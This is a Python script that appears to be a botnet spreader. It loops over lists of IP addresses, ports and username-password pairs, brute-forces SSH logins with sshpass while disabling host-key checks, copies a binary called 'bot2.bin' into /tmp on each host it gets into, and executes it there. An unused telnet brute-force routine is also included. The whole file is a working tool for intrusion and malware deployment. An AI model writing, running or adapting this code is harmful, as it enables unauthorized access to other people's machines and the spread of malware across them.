import telnetlib
from scanner.looper import looper
from scanner.shell import shell
from scanner.looper import format
import os

"""
Files containing params
"""
USER_PASS = looper("passwords.txt", True).loop()
IPS = looper("ips.txt").loop()
PROTOCOLS = looper("protocols.txt", True).loop()
HERE = shell().execom("pwd")["subprocess"][0].rstrip()
FILE = "bot2.bin"
BINF = os.path.join(HERE, FILE)
DEF_DEST = "/tmp/"
DEBUG = True
OS = ""



def dbg(something):
    if DEBUG:
        print("debug {}".format(something))


def testTelnet(host, user, pwd):
    """
    test telnet connction return True if success // not used for now
    :param host:
    :param user:l
    :param pwd:
    :return:
    """
    thost = host
    tuser = user
    tpass = pwd

    tn = telnetlib.Telnet(thost, 23)
    tn.read_until("ogin: ")
    tn.write(tuser + "\n")
    tn.read_until("assword: ")
    tn.write(tpass + "\n")
    n, match, previous_text = tn.expect([r'incorrect', r'\$'], 4)
    if n == 0:
        return True
    else:
        return False


def testSsh(ip, u_p, protocol):
    """
    test ssh connection , return True if success
    :param ip:
    :param u_p:
    :param protocol:
    :return:
    """
    cmd = "sshpass -p {} ssh -q -tt -o ConnectTimeout=1 -o StrictHostKeyChecking=no {}@{} -p {} 'exit'".format(
        u_p[1].rstrip(), u_p[0].rstrip(), ip.rstrip(), protocol[0].rstrip())
    r = shell().execom(cmd)
    _OS = r["subprocess"][0].rstrip().find("64")
    OS = "64" if _OS > -1 else "32"
    dbg(OS)
    dbg(cmd)
    if r["retcode"] == 255 or r["retcode"] == 4:
        dbg("{}".format(r))
        return False
    elif r["retcode"] == 0:
        print(format(ip, protocol[0], u_p[0], u_p[1]).format())
        return True


def sync(file, usr, pwd, port, source, ip, dst):
    """
    upload on dst
    :param pwd:
    :param port:
    :param source:
    :param ip:
    :param dest:
    :return:
    """
    dbg("syncing")
    # first command , copy the file @target
    copy = 'sshpass -p {} scp -P {} {} {}@{}:{}'.format(pwd.rstrip(), port.rstrip(), "./{}".format(file.rstrip()),
                                                        usr.rstrip(),
                                                        ip.rstrip(), dst)
    print(copy)
    exec = shell().execom(copy)
    dbg(exec)
    if exec["retcode"] == 0:
        print("{} succesfully uploaded @{}:{}".format(source, ip, dst))
        # execute command to install the bin @dst
        rexec = 'sshpass -p {} ssh {}@{} -p {} "cd /tmp && ./{}"'.format(pwd.rstrip(), usr.rstrip(),
                                                                                        ip.rstrip(), port.rstrip(),
                                                                                         file, file)
        print(rexec)
        if shell().execom(rexec)["retcode"] == 0:
            print("{} sucessfully executed @{}".format(file.rstrip(), ip.rstrip()))
        else:
            print("failed to execute {} @{}".format(file.rstrip(), ip.rstrip()))

    else:
        print("failed to load {} @ {}:{}".format(file, ip, {dst}))


def main():
    """
    main loop
    :return:
    """
    dbg("enter main loop")
    for ip in IPS:
        for protocol in PROTOCOLS:
            for u_p in USER_PASS:
                dbg("attempt ssh connection")
                if "ssh" in protocol[1]:
                    if not testSsh(ip, u_p, protocol):
                        dbg("{} ==> cant connect on ssh".format(ip))
                    else:
                        dbg("attempting rsync copy to target")
                        sync(FILE, u_p[0], u_p[1], protocol[0], BINF, ip, DEF_DEST)
                # attempt scp upload in the target

                if "telnet" in protocol[1]:
                    """
                    telnet connection not used for now
                    """
                    if not testTelnet(ip, u_p[0], u_p[1]):
                        break


main()
